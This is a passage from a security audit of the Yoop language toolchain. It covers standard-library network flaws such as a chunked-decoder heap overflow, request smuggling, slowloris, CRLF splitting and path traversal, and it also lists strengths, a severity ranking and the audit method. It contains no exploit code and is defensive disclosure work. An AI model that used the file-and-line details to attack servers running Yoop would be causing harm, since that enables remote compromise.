  **Zig** ships a WebAssembly build of its own compiler as the seed, checked
  into the repo, so the bootstrap is a committed, diffable artifact rather than
  a download.
- **Artifact signing and provenance.** `cosign`/**sigstore** keyless signing,
  GitHub's `actions/attest-build-provenance`, and the **SLSA** levels are the
  current baseline. npm's lockfile `integrity` field is the everyday version
  of the same idea: pin bytes, not names.
- **Hardened defaults.** Rust and Go emit PIE, stack probes, and (Go) a
  non-executable stack by default; Rust enables `-Z stack-protector` per
  target and full RELRO on Linux. Clang and GCC in Fedora, Ubuntu and Debian
  default to `-fstack-protector-strong`, `_FORTIFY_SOURCE=2` or `3`, PIE and
  full RELRO for anything built through their packaging. Zig's release modes
  are explicit (`ReleaseSafe` vs `ReleaseFast`) and the safe one is a named
  choice rather than an absence.

---

## 12. The standard library's network surface, briefly

This section is included because a language's first HTTP server is the thing
someone will put on the internet. The audit was thorough; only the findings
that change the picture are listed here.

**Dangerous today.**

- The chunked decoder heap overflow (section 3) and the `Content-Length` wrap
  (section 4). Both reachable remotely, both on the client side too.
- No read timeout anywhere in the server: `readRequestHead`, `readBody`, and
  `readChunkedBody` loop on `await` with no deadline, and `ServerConfig` has
  no field for one, even though `std/net/tcp.yoop` offers `tcpSetTimeoutMs`
  and `tcpSetToken` and nothing in `std/http/` calls them. One client sending
  a byte a minute holds a connection forever (slowloris). Under `serve`, which
  is what all three example servers use, one such client stalls the whole
  server, because `serve` awaits each connection to completion before the next
  `accept` ([std/http/server.yoop:548-551](../std/http/server.yoop#L548-L551)).
- The client writes `u.target` and `u.host` into the request line and `Host`
  header with no CR/LF check
  ([std/http/client.yoop:127-131](../std/http/client.yoop#L127-L131)); a URL
  built from user input splits the request.
- The router's `*` wildcard hands the raw remainder to the handler and
  nothing anywhere normalizes `..`
  ([std/http/router.yoop:69-74](../std/http/router.yoop#L69-L74)). Std ships
  no file handler, so this is a loaded gun rather than a fired one, and there
  is no safe-join helper for the first application that writes one.
- `writeFile` is `fopen(path, "wb")`: mode `0666 & ~umask`, follows symlinks,
  no `O_EXCL` ([std/fs.yoop:136-140](../std/fs.yoop#L136-L140)). There is no
  temp-file API, no mode argument, no `chmod`.
- `Map<string, V>` hashes with unseeded FNV-1a
  ([std/core/strings.yoop:116-130](../std/core/strings.yoop#L116-L130)); any
  application keying a map on request data is floodable.

**Absent, and an application will improvise badly without it.** No random
number generator of any kind, so no way to make a session token, CSRF token,
nonce, IV or salt; no password hashing or KDF; no symmetric encryption or
signatures; no server-side TLS (`std/tls` is client-only); no cookie helpers;
no HTML or JSON escaping; no per-peer rate limiting; no checked-arithmetic
helpers; no memory zeroing for secrets; no constant-time comparison outside
`std/crypto`.

**Done right, and worth saying.** TLS verification is on by default with
`SSL_VERIFY_PEER`, a TLS 1.2 floor that fails closed, default CA paths, and
real hostname verification that distinguishes IP literals from DNS names
([runtime/yoop_tls.c:109-222](../runtime/yoop_tls.c#L109-L222)); the one
gap is that an empty `host` skips the hostname check rather than failing
([yoop_tls.c:190](../runtime/yoop_tls.c#L190)). The HTTP parser rejects
`Content-Length` plus `Transfer-Encoding`, conflicting `Content-Length`
values, obsolete line folding, and bare LF, all with the smuggling rationale
written out; response headers are CR/LF checked and a bad one replaces the
whole response with a 500; the server owns framing; `%2F` in a path is
rejected and splitting happens before decoding. SQLite exposes a real
parameter-binding API with `SQLITE_TRANSIENT` and the examples use it.
SHA-256 and HMAC-SHA-256 are verified against NIST and RFC 4231 vectors and
ship a correct constant-time comparison. No `system`, `popen` or `exec` is
called anywhere in `std/`.

---

## 13. What is done well

Credit where it is due, because a reviewer weighs this too.

- The code is honest. The runtime race in `run_task_step` is documented with
  a reproduction rate; the emitter comments say "no bounds check" rather than
  implying one; `docs/writing_yoop.md` section 10 lists the sharp edges. The
  exceptions are the spec's `mustNotShare` claim and the `vecGet` "traps"
  comment, both called out above.
- The C runtime has zero uses of `strcpy`, `strcat`, `sprintf`, `gets` or
  variable-length `alloca`; every `snprintf` is bounded and the two that can
  truncate check for it; `lstat` not `stat`; `realpath(path, NULL)` not a
  fixed buffer; reentrant time functions.
- The I/O abandon handshake (`fired` under `io_mu`, never-reused sequence
  numbers, deregister-before-destroy) is hard to get right and is right.
- The compile-time evaluator's extern allow-list is the correct shape and is
  checked before arguments are evaluated.
- Compile-time code execution requires an explicit `--plugin` flag; nothing in
  a source file causes third-party code to run at compile time. That is
  stricter than Rust (`build.rs`, proc-macros), Zig (`build.zig`) or npm
  (`postinstall`).
- Zero npm dependencies, least-privilege CI token, no `pull_request_target`.
- The three-stage fixpoint as a release gate, with only three documented
  non-reproducible regions normalized.
- The marker kinds (`owned`, `cleared`) are a genuine static check with
  forgery and laundering refused at the declaration site; this is the seed of
  a taint system and it works.
- `printf` with a runtime format is rewritten to `%s`, and the bug that
  motivated it is recorded with its output.
- Signed integer overflow is defined (wrapping) rather than UB.

---

## 14. Severity list

Ordered by how much each item would weigh in an outside review. Language and
toolchain properties first, then bugs in shipped code.

Language and toolchain properties:

1. FIXED. Compiling a source file could execute shell commands via the
   unquoted `library "NAME"` splice into `system()`; the link step now runs
   clang from an argv array with no shell, and library names are validated at
   the declaration. Section 10.
2. No bounds checks on any array, slice or vector access. Section 3.
3. Ownership and lifetimes are advisory; returning a `disposable` or a struct
   holding a `ref` to a local is a silent use-after-free. Section 5.
4. The seed binary is unverified and there is no independent bootstrap root.
   Section 11.
5. The `unsafe` gate does not cover `extern "C"`, `extern "intrinsic"`,
   `heapAlloc`/`heapFree`, unchecked string bridges, or untagged `union`, and
   is per module not per file. Section 7.
6. No thread-sharing rules; `mustNotShare acrossThreads` is documented as
   enforced and is not; `ref` into a `pooled` task dangles. Section 8.
7. Uninitialized locals contradict the spec; exhaustive `switch` lowers to
   `unreachable`. Section 6.
8. Division by zero and oversized shifts are UB; length arithmetic wraps
   silently; no checked helpers. Section 4.
9. The VS Code extension spawns a binary from the opened folder with no
   Workspace Trust gate. Section 10.
10. No hardening flags and `-O0` on every user binary. Section 11.
11. `string` is `char*`: NUL truncation, `strlen` lengths, UTF-8 validator
    accepts overlongs and surrogates, `printf(fmt, x, y)` gap. Section 9.
12. No signing or provenance on releases; two platforms uploaded from personal
    machines; Actions pinned by tag. Section 11.

Bugs in shipped code:

13. Remote heap overflow in the chunked decoder, server and client. Section 3.
14. Use-after-free window on stack task handles between `yoop_task_wait` and
    `yoop_task_free_sync_pair`; documented `run_task_step` race ending in a
    bad `free()`. Section 5.
15. `Content-Length` integer wrap, a request-smuggling primitive. Section 4.
16. No read timeouts in the HTTP server; `serve` is serial and is what every
    example uses. Section 12.
17. Client request splitting via unvalidated URL/host. Section 12.
18. Unbounded per-request string leak in the server. Section 9.
19. `yoop_cancel_link` / `yoop_cancel_release` race on `child->parent`.
    Section 8.
20. `/bin/sh -c` process spawn with an unlocked global slot table, linked into
    every program. Section 10.
21. `writeFile` permissions and symlink following; no temp-file API.
    Section 12.
22. Empty `host` disables TLS hostname verification. Section 12.
23. Unchecked `malloc` on the task-submit path and elsewhere in the runtime
    (null write under memory pressure). Runtime audit.

---

## 15. Method and limits

Four targeted reads of the tree were made: the compiler's typechecker and
codegen for language-level guarantees (including a grep of the 210k-line
self-hosted IR at `build/dev/bin/yoopiler_boot.ll` for `nsw`/`nuw`, bounds
branches, and `unreachable`); every file in `runtime/`; every file in `std/`
plus the three example servers; and the seed, release, CI, link, comptime,
module-resolution, LSP and extension code. The chunked-decoder overflow, the
`mustNotShare` gap, the uninitialized-local emission, the `system()` link
line, and the unverified seed were each re-read at source by hand.

Nothing was executed against a live target and no proof-of-concept was built.
The overflow in section 3 is established by reading the arithmetic, not by
crashing a server; the runtime races in section 5 are established by reading
the lock ordering, with one of them also documented by the runtime's own
comment. Three codegen claims rest on source reading rather than observed IR:
the uninitialized `let` slot, shift lowering, and the `ref` copy into a task
handle. Comparisons with other languages are from general knowledge of those
projects and are stated at the level of documented, stable behavior.
